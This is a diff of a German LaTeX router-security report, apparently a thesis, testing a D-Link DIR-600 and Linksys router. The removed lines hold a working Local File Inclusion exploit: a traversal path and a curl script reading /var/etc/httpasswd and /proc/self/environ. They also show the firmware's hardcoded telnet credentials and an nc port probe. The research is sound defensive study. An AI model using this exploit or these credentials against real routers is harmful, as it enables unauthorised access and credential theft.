+	Eine weitere Schwachstelle sind Passwörter die hartkodiert oder schlecht gewählt sind.
+	Hardcoded Credentials beschreibt das feste Hinterlegen der Zugangsdaten im Code. Angreifer können diese
+	dann einfach aus dem Quellcode herauslesen oder über andere Schwachstellen an sie gelangen.
+	Schlecht gewählte Passwörter lassen sich wiederum durch automatisierte Angriffe oder in manchen Fällen
+	durch schlichtes Raten herausfinden. 
 	
-	Mit dem Filter \texttt{dns} lassen sich lediglich die Pakete anzeigen die an den DNS-Server gesendet werden.
-	Der klassische DNS Server nutzt UDP (Port 53) und verschlüsselt seine Inhalte nicht.
-	Die besuchten Domänen und Hintergrundinformationen sind voll einsehbar.
+	Ergänzend spielen auch klassische Web-Schwachstellen eine Rolle. Beispielsweise können SQL-Injection
+	genutzt werden, um Authentifizierungsmechanismen zu umgehen, indem Datenbankabfragen manipuliert werden.
+	Ebenso können sprachspezifische Besonderheiten wie PHP Loose Comparison dazu führen, dass Vergleiche
+	zwischen Werten als gültig interpretiert werden und dadurch Sicherheitsprüfungen fehlschlagen.
+	\cite{sessionmanagementowasp, cwecwe798use, cwecwe521weak, cwecwe89improper, bakhshi2024}
 
-	\begin{figure}[H]
-		\centering
-		\includegraphics[width=\textwidth]{img/http_login_dlink.png}
-		\caption{Wireshark Filter: http}
-		\label{fig:http}
-	\end{figure}
-	Der Router nutzt HTTP, das bedeutet die Pakete werden unverschlüsselt übertragen.
-	Beim Login auf die Admin Seite des Routers http://192.168.0.1 sind die Benutzer und Passwort
-	im Klartext einsehbar. Auch das Ändern des Passworts und das Einstellen anderer
-	Konfigurationen konnte im Netzwerkmitschnitt beobachtet werden.
-	Die Web-Oberfläche inklusive der UI, Statusseite und den Konfigurationen wird über HTTP geladen.
-	Ohne Transportverschlüsselung können Daten und Session-Inhalte passiv oder aktiv durch Man-in-the-Middle-Angriffe
-	mittgeschnitten oder manipuliert werden.
+	\subsection{Eingabevalidierungsfehler}
+	Eingabevalididerungsfehler sind Fehler in dem Valisierungsmechanismus eines Systems. 
+	Das System erhält externe Eingaben, prüft, filtert oder bereinigt diese aber nicht ausreichend.
+	Insbesondere wenn ein System Benutzereingaben übernimmt, ohne deren Struktur oder Kontext angemessen
+	zu validieren, hat das folgen für die Sicherheit des Systems.
 
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=\textwidth]{img/Passwort_telnet.png}
-	\caption{Wireshark Filter: telnet}
-	\label{fig:Telnet Passwort}
-\end{figure}
-	Auch die Verbindung über das Telnet Protokoll wird unverschlüsselt übertragen.
-	Die Authentifizierungsdaten sind klar nachvollziehbar und können leicht rekonstruiert werden. 
-	Telnet arbeitet zeichenbasiert, daher wird jedes Zeichen als eigenes Paket oder Teil eines Streams geschickt.
-	Sitzungen können vollständig rekonstruiert werden.
+	Comand Injection ist eine besonders kritische Ausprägung dieser Fehlerklasse.
+	Dabei gelingt es einem Angreifer Kommandos so zu modifizieren, das zusätzliche Befehle in einen 
+	bestehenden Ausführungskontext einzuschleusen. Eingaben werden dabei meistens direkt in Systemaufrufe
+	oder Shell-Kommandos integriert werden, ohne zuvor ausreichend neutralisiert zu werden.
+	Einem legitimen Eingabewert wird ein weiteres Kommando angehängt, welcher anschließend vom System interpretiert
+	und ausgeführt wird. Damit können unter Umständen Authentifizierungsdaten ausgegeben werden.
+	Neben der Ausführung von beliebigem Code können Angreifer ihre Privilegien Erweitern, 
+	vertrauliche Daten auslesen oder die vollständige Kontrolle über das Gerät erlangen.
+	Gerade aber Routern kann dies weitreichende Folgen haben, da diese die Schnittstelle zum Netzwerk darstellt.
+	Bei einer Kompromittierung können Angriffe auf das gesamte Netzwerk ausgebreitet werden.
 
-	Das Address Resolution Protocol (ARP) ist ein Netzwerkprotokoll, welches zu einer Netzwerkadresse die 
-	physische Adresse ermittelt und diese Zuordnung in der ARP-Tabelle gegebenenfalls hinterlegt.
-	ARP ist ein Layer 2 Protokoll und bietet keine Authentifizierung. Angriffe wie MAC-Spoofing oder 
-	ARP-Spoofing sind möglich. 
+	Bei Routern treten diese Art der Angriffe, insbesondere im Zusammenhang mit der Administrationsoberflächen
+	auf. Diese Web-Interface-Injections entstehen, wenn HTTP-Parameter oder Formulareingaben serverseitig
+	verarbeitet werden. \cite{cwecwe77improper, cwecwe20improper}
 
-	Dieselben Mittschnitte wurden über das WLAN ebenfalls untersucht, es wurden keine prägnanten Unterschiede festgestellt.
+	\subsection{Unsichere Firmware-Architektur}	
+	Die Firmware ist das Grundgerüst des Routers, wird sie kompromittiert hat der Angreifer Zugriff auf das gesamte System.
+	Eine unsichere Firmware Architektur basiert weniger auf einzelnen Programmierfehlern, sondern vielmehr
+	aus strukturellen Problemen in der System-Architektur sowie im gesamten Lebenszyklus der Firmware.
+	Fehlende Update-Mechanismen, die Wiederverwendung veralteter Softwarekomponenten sowie unzureichendes
+	Patchmanagement sind zentrale Risikofaktoren.
 
-	Die Analyse zeigt, das mehrere zentrale Dienste ohne kryptographische Absicherung betrieben werden. Dies macht
-	Angriffe auf das Netzwerk möglich, wodurch Authentifizierungsdaten kompromittiert werden können.
+	Ein wesentlicher Aspekt sind unsichere Firmware Updates. Einige Router implementieren Update-Mechanismen nicht
+	ausreichend abgesichert. Diese sollten durch eine kryptografische Signatur, Identitätsprüfung und
+	sichere Übertragungsprotokolle geschützt werden. Ist dies nicht der Fall, besteht das Risiko, dass das
+	Gerät mit manipulierter Software aktualisiert wird.
 
-	\subsection{Gehärteter Router}
-	\label{sec:Gehärteter Router}
-	***In Arbeit***
+	Ein weiteres Problem ist das Verwenden veralteter oder nicht gewarteter Softwarebibliotheken.
+	Die Firmware auf den Routern basiert oftmals auf veralteten Linux-Kernel-Versionen und
+	Open-Source-Komponenten, die bekannte Schwachstellen enthalten. Wird der Software dritter nicht regelmäßig
+	aktualisiert und ist veraltet bleiben bereits entdeckte Sicherheitslücken erhalten und können 
+	von Angreifern ausgenutzt werden. Auch fehlende oder verzögert durchgeführte Sicherheitsupdates
+	stellen einen Angriffsvektor dar. Viele Router besitzen keine automatisierte Update-Mechanismen oder
+	keine langfristige Herstellerunterstützung. Auch das führt dazu das bereits bekannte Schwachstellen
+	weiter auf dem Gerät existieren.
 
-	\section{Firmware-Analyse}
-	\label{sec:Firmware-Analyse}
-	Zur Analyse der Firmware wurde das Tool \texttt{binwalk} eingesetzt:
-
-	\begin{lstlisting}[basicstyle=\ttfamily,
-		columns=fullflexible,
-    	keepspaces=true,
-    	breaklines=true
-		]
-	binwalk DIR600B_FW205b01.bin 
-	
-	DECIMAL     HEXADECIMAL  	DESCRIPTION
-	------------------------------------------------------------
-	48          0x30        	Unix path: /dev/mtdblock/2
-	96          0x60           	uImage header, header size: 64 bytes,
-								image size: 879555 bytes,
-								Data Address: 0x80000000,
-								Entry Point: 0x802B7000,
-								OS: Linux, CPU: MIPS,
-								compression type: lzma
-	160         0xA0           	LZMA compressed data
-	917600      0xE0060        	Squashfs filesystem
-	\end{lstlisting}
-	
-	Der uImage Header enthält unter anderem Informationen zur CPU (MIPS), zur Ladeadresse im RAM sowie zum Einstiegspunkt
-	des Kernels. Das verwendete Linux-System basiert auf einem Kernel der Version 2.6.x, was auf ein
-	veraltetes System hindeutet.
-
-	\begin{table}[h]
-		\centering
-		\hypertarget{tabelle1}{}
-			\begin{tabularx}{\columnwidth}{|X|X|}
-			\hline
-			header size: 64 bytes & beschreibt den Kernel \newline enthält CRCs, Entry Point \\
-			\hline
-			image size: 879555 bytes & Größe des Kernel-Images \\
-			\hline
-			Data Address: 0x80000000 & RAM-Adresse, wo Kernel geladen wird \\
-			\hline
-			Entry Point: 0x802B7000 & Startadresse der Kernel-Ausführung \\
-			\hline
-			OS: Linux, CPU: MIPS & Zielarchitektur MIPS \\
-			\hline
-			compression: lzma & Kernel ist komprimiert, spart Flash-Speicher \\
-			\hline
-			\end{tabularx}
-		\caption{Inside The uImage}
-	\end{table}
-	
-	In LZMA compressed data steht der eigentliche Kernel Code, komprimiert mit LZMA.
-	Dictionary size: 32MB bestimmt das Kompressionsfenster und ist typisch für Embedded Linux Kernel.
-	uncompressed size 2.9MB ist die reale Kernelgröße nach dem Entpacken.
-
-	PackImg section delimiter tag Das ist ein marker für den Beginn einer weiteren Firmware-Section. 
-
-	SquashFS ist ein komprimiertes, schreibgeschütztes Linux Dateisystem der version 3.0.
-	Durch Ausführen von:
-	\begin{lstlisting}[basicstyle=\ttfamily]
-		binwalk -e DIR600B_FW205b01.bin 
-	\end{lstlisting}
-	wurde die Förmwear extrahiert und das Dateisystem zugänglich gemacht. \cite{squashfs40filesystemab}
-	
-	\subsection{LFI-Schwachstelle}
-	\label{sec:LFI-Schwachstelle}
-
-	Im Rahmen der Firmware-Analyse wurde im Verzeichniss \texttt{squashfs-root/www/} 
-	die Implementierung des Webinterface untersucht. Dabei konnte in der Datei \newline
-	\texttt{squashfs-root/www/model/\_\_show\_info.php} eine sicherheitsrelevante Schwachstelle
-	identifiziert werden.
-	Die Datei fungiert als generischer Content-Renderer für das Webinterface. 
-	Sie ermöglicht unter anderem das dynamische Einbinden von Dateien.
-	Der relevante Codeabschnitt lautet:
-\begin{lstlisting}[language=PHP]
-if($REQUIRE_FILE!="")
-{
-	require($LOCALE_PATH."/".$REQUIRE_FILE);
-}
-\end{lstlisting}
-
-	Hierbei wird der Parameter \texttt{REQUIRE\_FILE} ohne Validierung in einen Dateipfad eingebunden
-	und anschließend mittels \texttt{require()} eingebunden. Da dieser Parameter direkt durch den
-	Benutzer kontrolliert werden kann, entsteht eine Local File Inclusion (LFI)-Schwachstelle.
-	Durch das Verwenden von Directory Traversal Sequenzen, also der unautorisierte Zugriff auf Dateien 
-	mittels Pfadangaben in der URL, können unter anderem sensible Daten eingesehen werden.
-	Beispielsweise folgende Anfrage: \newline
-	\texttt{/www/locale/en\_US/ + ../../../../var/etc/httpasswd}. \newline
-	PHP löst das dann zu /var/etc/httpasswd auf, die Datei wird eingebunden und der Inhalt auf der Webseite sichtbar.
-	\begin{figure}[H]
-		\centering
-		\includegraphics[width=\textwidth]{img/Passwort.png}
-		\caption{Seite nach Exploit}
-		\label{fig: Hallo}
-	\end{figure}
-
-	Auswirkung
-	Die Datei /var/etc/httpasswd enthält für den aktuellen Benutzername und das Passwort,
-	welche wiederum oft nur schwach gehasht oder wie in diesem Fall im Klartext in der Datei gespeichert wird.
-	Dies ermöglicht die Umgehung der Authentifizierung.
-
-	Automatisierte Analyse
-	Ein automatisiertes Testskript wurde verwendet um verschiedene Dateisysteme abzurufen.
-\begin{lstlisting}[language=bash]
-#!/bin/bash
-
-if [ $# -ne 1 ]; then
-	echo " Error: No IP-Adress"
-	exit
-fi
-
-IP_ADR=$1
-
-FILES=(
-	"/var/etc/httpasswd"
-	"/var/log/messages"
-	"/proc/self/cmdline"
-	"/proc/self/environ"
-	"/proc/mounts"
-	"/proc/version"
-	"/proc/cpuinfo"
-	"/etc/hosts"
-)
-
-test_file() {
-echo "------------------------------------"
-echo "Test: $1"
-echo "------------------------------------"
-local encode
-encode=$(printf "%s" "$1" | jq -sRr @uri)
-
-curl -s "http://${IP_ADR}/model/__show_info.php?REQUIRE_FILE=${encode}" \
-	-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
-	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
-	-H 'Accept-Language: en-US,en;q=0.5' \
-	-H 'Accept-Encoding: gzip, deflate' \
-	-H 'Connection: keep-alive' \
-	-H 'Upgrade-Insecure-Requests: 1' \
-	-H 'Priority: u=0, i' \
-| sed -e 's/<!--.*-->//g' \
-		-e 's/<[^>]*>//g' \
-		-e 's/&nbsp;//g' \
-		-e '/^\s*$/d'
-}
-
-for file in "${FILES[@]}"; do
-test_file "$file"
-done
-
-exit
-\end{lstlisting}
-	Das Skript arbeitet die einzelnen Pfade nacheinander ab. Der Befehl curl überträgt Daten zwischen dem Rechner
-	und einem Server. Mit -H lassen sich HTTP-Header setzen. Zudem wurde das Paket $jq$ installiert, so kann die Eingabe automatisch
-	entsprechend der URL-Vorgaben formatiert werden. \cite{pathtraversalowaspb, reschke2015b, wstgstableowaspb}
-
-	\begin{itemize}
-	\item \texttt{/var/etc/httpasswd} – enthält Zugangsdaten für das Webinterface
-	\item \texttt{/var/log/messages} – enthält Logdaten und Netzwerkaktivität
-	\item \texttt{/proc/self/cmdline} – enthält informationen zur CommandLine des Prozesses
-	\item \texttt{/proc/self/environ} – zeigt Umgebungsvariablen des Prozesses 
-	\item \texttt{/proc/mounts} –zeigt Mountpoints und die Filesystem-Struktur
-	\item \texttt{/proc/version} – liefert Kernel-Informationen
-	\item \texttt{/proc/cpuinfo} – enthält Informationen zur Hardwarearchitektur
-	\item \texttt{/etc/hosts} – enthält den Hostnamen und die interne Struktur
-	\end{itemize}
-
-	\subsection{Bewertung:}
-	\label{sec:lfi}
-
-	\begin{itemize}
-		\item \textbf{Attack Vector (AV):} Network
-		\item \textbf{Attack Complexity (AC):} Low
-		\item \textbf{Privileges Required (PR):} None
-		\item \textbf{User Interaction (UI):} None
-	\end{itemize}
-
-	\textbf{Auswirkungen:}
-	\begin{itemize}
-		\item \textbf{Confidentiality (C):} High
-		\item \textbf{Integrity (I):} Low
-		\item \textbf{Availability (A):} Low
-	\end{itemize}
-
-
-	Router wurde reseted, durch langes drücken des Reset Knopfs.
-	Nutzer und Passwort wurden zurückgesetzt.
-	Nutzer: admin
-	Passwort: (blank)
-	Einloggen hat geklappt, Zugriff auf die Adminseite.
-
-
-	\textbf{Voraussetzungen:}  
-	Zugriff auf das Webinterface des Routers (LAN/WLAN).
-
-	\textbf{Gesamtbewertung:}  
-	High, durch das extrahieren der Authentifizierungsdaten sind weitere Angriffe auf den Router möglich.
-
-	\textbf{Begründung:}  
-	Die Schwachstelle erlaubt das Auslesen sensibler Systemdateien ohne
-	Authentifizierung, was zu einem hohen Verlust an Vertraulichkeit führt.
-	Die Ausnutzung ist trivial und erfordert keine besonderen Bedingungen.
-
-	\subsection{Telnet}
-	Im Rahmen der Analyse wurde überprüft, ob der Router eine Telnet-Schnittstelle für Remote-Zugriffe bereitstellt.
-	Teletype Network (Telnet) ist ein Client/Server basiertes Protokoll (Port 23).
-	Der Austausch erfolgt über eine TCP Verbindung. Bei Routern dient Telnet als Remote-Management-Protokoll
-	und gibt dem Benutzer eine Kommandozeile auf dem Gerät.
-	Mit folgendem Befehl ist es möglich herauszufinden ob der Router eine Telnet Schnittstelle besitzt.
-\begin{lstlisting}[basicstyle=\ttfamily]
-nc -zv 192.168.0.1 23
-Connection to 192.168.0.1 23 port [tcp/telnet] succeeded!
-\end{lstlisting}
-	
-	Der D-Link DIR 600 besitzt eine Telnet-Schnittstelle, welche durch einen Nutzter und ein Passwort
-	geschützt sind. Unter einem Embedded Linux ist der Standardnutzer in diesem Fall \texttt{Alphanetworks}.
-	Dies lässt sich durch eine kurze Recherche über das Internet herausfinden. Das Standardpasswort des Routers unterscheidet sich
-	nach Modell. Um das Passwort der Telnet-Schnittstelle herauszufinden, wurden die Firmware des Routers
-	erneut analysiert.
-	\texttt{grep -r "Alphanetworks"}
-\begin{lstlisting}[basicstyle=\ttfamily]
-squashfs-root/etc/scripts/misc/telnetd\.sh: \
-telnetd -l "/usr/sbin/login" -u Alphanetworks:\$image\_sign -i \$lf &}
-\end{lstlisting}
-	Mit dem grep Befehl wurde die Firmware nach dem Standartnutzer rekursiv durchsucht.
-	Das Ergebnis zeigt den Benutzer und das Passwort, welches in \texttt{\$image\_sign} gespeichert wird.
-	\texttt{grep -r "image\_sign" squashfs-root/}
-\begin{lstlisting}
-squashfs-root/etc/scripts/misc/telnetd\.sh:
-image\_sign=`cat /etc/config/image\_sign`
-\end{lstlisting}
-	Die Ausgabe zeigt unter anderem diese Zeile, welche den Pfad zu dem Passwort enthält.
-	\texttt{cat squashfs-root/etc/config/image\_sign}
-	\texttt{wrgn23\_dlwbr\_dir600b}
-Der \texttt{cat-Befehl} liefert das Passwort.
-\begin{lstlisting}[basicstyle=\ttfamily]
-Trying 192.168.0.1...
-Connected to 192.168.0.1.
-Escape character is '^]'.
-login: Alphanetworks
-Password: wrgn23\_dlwbr\_dir600b
-\end{lstlisting}
-	Eine erfolgreiche Anmeldung bestätigt die Gültigkeit dieser Zugangsdaten.
-	
-	Nach erfolgreicher Anmeldung erhält der Benutzer Zugriff auf eine Shell-Umgebung, die durch \texttt{Busybox}, 
-	bereitstellt wird. BusyBox ist eine Sammlung von Unix-Werkzeugen, die unter anderem eine Shell bereitstellen. 
-	Der Befehl \texttt{mount} zeigt folgendes:
-\begin{lstlisting}[basicstyle=\ttfamily]
-/dev/root on / type squashfs (ro)
-none on /proc type proc (rw)
-sysfs on /sys type sysfs (rw)
-ramfs on /var type ramfs (rw)
-\end{lstlisting}
-	Durch die Ausgabe wird deutlich, das es sich um eine Read-Only-Firmware mit einem Eingebetteten Linux Design handelt.
-	Lediglich der RAM ist beschreibbar, jedoch sind die Daten dort nur während der Laufzeit verfügbar und verschwinden nach einem Reboot.
-	Dort werden typischerweise Logs, temporäre Dateien und Runtime-Konfigurationen gespeichert.
-	/proc enthält Prozess- und Systeminformationen und /sys Kernelparameter und die Hardwareabstraktion.
-	Hier können Parameter gesetzt aber das System nicht persistent geändert werden.
-	
-	Der Benutzer und das Passwort für die Telnet-Verbindung sind hardkodiert und im System eingebettet. Sie können nicht geändert werden.
-	Auch wenn auf dem System Daten nicht persistent geändert werden können, stellt die Telnet-Schnittstelle ein
-	Risiko dar. Ein Angreifer könnte durch den Befehl \texttt{reboot} eine sofortige Unterbrechung des Netzwerks
-	auslösen. Da Schreibrechte auf dem /var Verzeichnis existieren könnten dort viele und große Dateien erzeugt werden, um so den 
-	Speicher zu füllen und die Dienste zu destabilisieren. Dies könnte den Router verlangsamen oder zu einem 
-	reboot führen. Außerdem kann der Angreifer durch Befehle wie ping, msh, kill oder busybox Prozesse mehrfach starten und die CPU dauerhaft belasten.
-	Desweiteren können Routerkonfigurationen, die interne Netzstruktur, DNS und Gateway sowie die aktiven Clients
-	eingesehen werden, was die Informationsgewinnung erleichtert. \cite{nvdcve202642375ab,telnetprotocolspecificationb}
-
-	\subsection{Bewertung:}
-	\label{sec:Bewertung-Telnet}
-
-	\begin{itemize}
-		\item \textbf{Attack Vector (AV):} Network
-		\item \textbf{Attack Complexity (AC):} Low
-		\item \textbf{Privileges Required (PR):} Low
-		\item \textbf{User Interaction (UI):} None
-	\end{itemize}
-
-	\textbf{Auswirkungen:}
-	\begin{itemize}
-		\item \textbf{Confidentiality (C):} High
-		\item \textbf{Integrity (I):} High
-		\item \textbf{Availability (A):} High
-	\end{itemize}
-
-	\textbf{Voraussetzungen:}  
-	Zugriff über Telnet (LAN/WLAN), ermitteln des Passworts.
-
-	\textbf{Gesamtbewertung:}  
-	High, es sind weitere Angriffe über die Telnet-Verbidung möglich.
-
-	\textbf{Begründung:}  
-	Die Schwachstelle erlaubt den Zugriff auf eine Remote Shell.
-	Sensible Daten könne ausgelsen werden und Befehle ausgeführt werden.
-	Die Ausnutzung ist trivial und erfordert keine besonderen Bedingungen. 
-
-	\subsection{Analyse des DDNS-Systems}
-	Die Analyse des DDNS-Subsystems dient dazu, potenzielle sicherheitskritische Datenflüsse zwischen
-	Konfigurationsdatenbank, Skripten und Netzwerkkommunikation zu identifizieren.
-	Im Fokus steht die Rekonstruktion der Programmstruktur mittels Reverse Engineering %nochmal erklräen
-	sowie eine anschließende Bewertung.
-
-	Die Firmware des D-Link DIR-600 Routers zeigt eine typische Architektur für eingebettete Linux-Systeme.
-	Konfigurationsdaten werden über den Dienst \texttt{xmldbc} verwaltet, eine XML-Datenbank.
-	Das Dynamic Domain Name System auch DDNS genannt, ist hier nicht als externe Bibliothek implementiert, sondern als separates Binärprogramm.
-	Die DDNS-Funktionalität wird über dynamisch generierte Shell-Skripte gestartet.
-\begin{lstlisting}[language=PHP]
-# dyndns.sh
-rgdb -A $TROOT/misc/dyndns_run.php -V generate_start=$START > /var/run/dyndns.sh
-sh /var/run/dyndns.sh > /dev/console
-\end{lstlisting}
-	Die eigentliche Logik wird dabei durch ein PHP-Template dynamisch, also während der Laufzeit erzeugt.
-	Dieses Template entscheidet aufgrund von Konfigurationswerten aus der Router-Datenbank, ob und welcher DDNS-Client
-	gestartet wird.
-	
-	Die eigentliche Befehlslogik wird dabei dynamisch erzeugt:
-\begin{lstlisting}[language=PHP]
-if ($USER!="" && $PASS!="")
-{
-	echo "echo Start dyndns #".$provider."... > /dev/console\n";
-	echo "echo dyndns > ".$progfile."\n";
-	echo "dyndns -S \"".$provider;
-	echo "\" -u \"".$USER."\" -p \"".$PASS."\" -i ".$IPADDR." -t ".$TIME;
-	echo " -o /var/run/dyndns.html -d \"".$vendor." ".$model."\"";
-	echo " -q \"/var/run/dyndns.info\"";
-	if ($HOST!="") { echo " -n \"".$HOST."\""; }
-	echo " > /dev/console &\n";
-}
-\end{lstlisting}
-	Hierbei wird zur Laufzeit ein Systembefehl generiert und ausgeführt.
-	Es zeigt sich, dass sämtliche Parameter, einschließlich Benutzername, Passwort, Hostname und IP-Adresse,
-	direkt aus der Konfigurationsdatenbank übernommen werden. Eine zusätzliche Validierung
-	dieser Eingabe findet nicht statt. Dies stellt einen kritischen Punkt dar, da es sich dabei
-	um potenziell manipulierte Daten handelt könnte.
-
-	Die Analyse des Binärprogramms \texttt{/usr/bin/dyndns} wurde mithilfe von Ghidra genauer analysiert 
-	Es zeigt, dass die Kommandozeilenargumente direkt verarbeitet werden:
-\begin{lstlisting}[language=c]
-case 0x6e:  // -n
-	pcRam1000027c = optarg;   // hostname
-case 0x70:  // -p
-	DAT_10000288 = optarg;    // password
-case 0x69:  // -i
-	DAT_10000280 = optarg;    // IP address
-case 0x53: // -S
-	DAT_10000274 = atoi(optarg);  // provider ID
-\end{lstlisting}
-	
-	Anschließend wird anhand einer Service-ID entschieden, welcher DDNS-Anbieter
-	verwendet wird. Hierfür wird eine intern Tabelle verwendet, welche Service-Namen numerische Identifikation zuordnet.
-	Falls die Parameter ungültig oder unvollständig führt dies zum Programm abbruch.
-
-	Nach der Konfigurationsphase folgt die Netzwerklogik.
-	Das Programm arbeitet mit zustandbasierter Logik über \texttt{select()}:
-\begin{lstlisting}[language=c]
-iVar2 = select(uVar7 + 1,
-		(fd_set *)local_288,
-		(fd_set *)__writefds,
-		(fd_set *)0x0,
-		&local_290);
-\end{lstlisting}
-	Interpretation der Zustände:
-	0 = disconnected
-	1 = connecting
-	2 = connected/update running
-	Abhängig vom aktuellen Zustand werden zyklisch Netzwerkverbindungen aufgebaut, geprüft oder erneuert. 
-	Dabei werden klassische BSD-Socket-Funktioenen wie \texttt{socket()} und \texttt{connect()},
-	um eine Verbindung zu den jeweiligen DDNS-Servern herzustellen.
-	
-	Die Auswahl des DDNS-Anbieters bestimmt dabei den Aufbau der HTTP-Anfrage. 
-	Die Firmware unterstützt mehrere Anbieter beispielsweise DynDNS, No-IP, wobei jeder Anbieter ein spezifisches Anfrageformat verwendet. 
-	Beispiel DynDNS.org
-\begin{lstlisting}[language=c]
-snprintf(acStack_260,500,
-	"GET /nic/update?&hostname=%s&ip=%s HTTP/1.0\r\n
-		Authorization: Basic %s\r\n
-		User-Agent: %s\r\n
-		Host: %s\r\n\r\n",
-		uRam1000027c,puVar2,uVar1,DAT_10000294,DAT_10000278);
-\end{lstlisting}
-	Die HTTP-Requests werden manuell zusammengesetzt und direkt über eine Socket-Verbindung versendet.
-	Zusätzlich wird in den meisten Fällen eine Basis-Authentifizierung, bestehend aus Benutzername und Passwort
-	verlangt, welche Base64 codiert in den HTTP-Header integriert werden (siehe oben).
-	\texttt{base64encode(pcVar4,sVar3,&uStack\_28)}
-
-	Die Implementierung weist einige sicherheitskritische Schwächen auf, die für ältere Embedded-Systeme typisch sind.
-	Insbesondere der Verzicht auf eine verschlüsselte Kommunikation stellt ein potenzielles Risiko dar. 
-	Sämtliche DDNS-Anfragen erfolgen über eine ungesicherte HTTP-Verbindung, wodurch Zugangsdaten im Klartext über das Netzwerk übertragen werden können.
-	Dadurch besteht ein erhebliches Risiko für Man-in-the-Middle Attacken sowie das Abgreifen von Zugangsdaten.
-
-	Zudem werden sensible Daten im Speicher verarbeitet. Authentifizierungsinformationen werden global abgelegt und mehrfach
-	in unterschiedlichen Verarbeitungsschritten verwendet. Auch wenn keine direkten Schwachstellen im 
-	untersuchten Codeabschnitt sichtbar sind, bleibt durch die unsauberen Datenflüsse und die 
-	fehlende strikte Validierung ein erhöhtes Sicherheitsrisiko. \cite{thomas2021b}
-
-	\subsection{Bewertung:}
-	\label{sec:Bewertung-DDNS}
-
-	\begin{itemize}
-		\item \textbf{Attack Vector (AV):} Network
-		\item \textbf{Attack Complexity (AC):} Low
-		\item \textbf{Privileges Required (PR):} None
-		\item \textbf{User Interaction (UI):} None
-	\end{itemize}
-
-	\textbf{Auswirkungen:}
-	\begin{itemize}
-		\item \textbf{Confidentiality (C):} High
-		\item \textbf{Integrity (I):} Low
-		\item \textbf{Availability (A):} Low
-	\end{itemize}
-
-	\textbf{Voraussetzungen:}  
-	Zugriff auf das Netzwerk (LAN).
-
-	\textbf{Gesamtbewertung:}  
-	High, es ist möglich den Netzwerkverkehr zu verfolgen (Man-in-the-Middle Attack)
-
-	\textbf{Begründung:}  
-	Die DDNS-Kommunikation erfolgt unverschlüsseltüber HTTP, wodurch Authentifizierungdaten
-	im Klartext übertragen werden. Ein Angreifer kann diese durch einen Netzwerk-Mittschnitt
-	abfangen und für weiter Angriffe verwenden.
-	Dies ist mit geringem Aufwand möglich und erfordert keine besondere Voraussetzung.
-
-	Die fehlende Validierung der Parameter stellt ein potenzielles Risiko dar, konnte im Rahmen
-	der Analyse jedoch nicht zu einer konkreten Schwachstelle weitergeführt werden.
-
-	% --------------ToDo--------------------%
-	% Formatierung schön machen 
-	% Bilder einfügen
-	% Telnet voll fertig schreiben
-	% WIRESHARK wichtig
-	% Passwort testing auf der Webseite
-	% Quellen korrekt einfügen auch im Text
-	% --------------------------------------%
+	Zusätzlich spielt die mangelnde Kontrolle über Drittanbieter-Komponenten eine entscheidende Rolle.
+	Firmware wird oftmals aus mehreren externen Modulen zusammengesetzt, deren Sicherheitsniveau heterogen ist.
+	Werden diese Komponenten und Schnittstellen nicht regelmäßig geprüft können sich Schwachstellen in das 
+	gesamte System einschleusen. Diese Risiken stehen zwar nicht im direkten Einflussbereich des 
+	Router-Herstellers, trotzdem ist es dessen Aufgabe die Schnittstellen ausreichend zu testen und abzusichern
+	um eine sichere Architektur gewährleisten zu können. \cite{bakhshi2024, qasem2024}
 
 	\chapter{Tests Linksys WRT120N}
 	\label{sec:tests_wrt120n}
@@ -1597,14 +1178,9 @@ sudo wireshark
 	die Liste ausschließlich Geräte enthält, denen der Zugriff verweigert wird.
 	Dadurch lassen sich die weiteren Tests einfacher durchführen, ohne fortlaufende 
 	Änderungen an den Router-Einstellungen vornehmen zu müssen.
-	Des weitern wurde getestet, ob sich beim Aufzeichnen des Netzwerkverkehrs mit
+	Desweitern wurde getestet, ob sich beim Aufzeichnen des Netzwerkverkehrs mit
 	Wireshark eine Veränderung zeigt. Der PC, der sich im besagten WLAN befindet,
 	konnte die gleichen Vorgänge mitschneiden wie in Abschnitt \ref{w_basic_settings}.
-	Wie im Abschnitt %<-----------------------$\ref{label Abschnitt MAC-Adressen Verschleierung}$ erläutert
-	können MAC-Adressen von einem Gerät aus verschleiert werden. Das erschwert 
-	es die Funktion der MAC-Adress-Filterung. Die MAC-Adresse kann teilweise
-	für bestimmte Netzwerke unverschleiert angezeigt werden, dies muss dann aber
-	auf dem Gerät für das bestimmte WLAN eingestellt sein.
 	\newline
 	Schlussfolgerung: Die Sicherheitseinstellungen für das WLAN sollten zwingend gemacht
 	werden, da sie den Zugriff stark einschränken und es den potenziellen
@@ -1875,6 +1451,643 @@ rescue ::Rex::ConnectionError
 	wichtig im eigenen WLAN nur Geräte zuzulassen, deren MAC-Adressen bekannt sind
 	damit wird dem Angreifer direkt der Zugang zum WLAN verweigert und diese
 	Schwachstelle kann nicht ausgenutzt werden.
+
+	\chapter{Tests D-Link DIR-600}
+	\label{sec:Tests D-Link DIR-600}
+	%-------------TEST die alle NICHT funktioniert haben---------------------%
+	Ziel der Untersuchung war es, potenzielle Sicherheitslücken zu identifizieren und zu testen.
+	Die Analyse wurde unter Kali Linux durchgeführt, wobei der Router sowohl über Ethernet als auch
+	über das Wireless Local Area Network (WLAN) verbunden war.
+	Die IP-Adresse des Gerätes (192.168.0.1) wurde mittels \texttt{ping} sowie \texttt{ip route}
+	verifiziert.
+	
+	Grundtest:
+	\begin{table}[h]
+		\hypertarget{tabelle1}{}
+		\begin{tabularx}{\columnwidth}{|X|X|X|}
+			\hline
+			Pingen des Routers & ping 192.168.0.1 & Router wurde erreicht \\
+			\hline
+			Zugriff auf die Admin Seite & Firefox (http://192.168.0.1) & Login Seite wurde geladen, aber Authentifizierungsdaten schlugen fehl \\
+			\hline
+		\end{tabularx}
+		\caption{Testtabelle}
+	\end{table}
+
+	Es wurden verschiedene Zugangsdaten getestet, jedoch ohne Erfolg. Nach einem Factory Reset
+	durch das Gedrückt halten der Reset-Taste für etwa 15 Sekunden wurden die Zugangsdaten auf die
+	Werkseinstellungen zurückgesetzt. Anschließend war ein Login mit dem Standardbenutzer
+	\texttt{admin} und einem leeren Passwort möglich.
+
+	Die Bewertung der identifizierten Schwachstellen erfolgt angelehnt an das Common Vulnerability
+	Scoring System (CVSS). Dabei werden insbesondere Angriffsvektor, Komplexität, benötigte Privilegien
+	sowie die Auswirkung auf Vertraulichkeit, Integrität und Verfügbarkeit berücksichtigt.
+
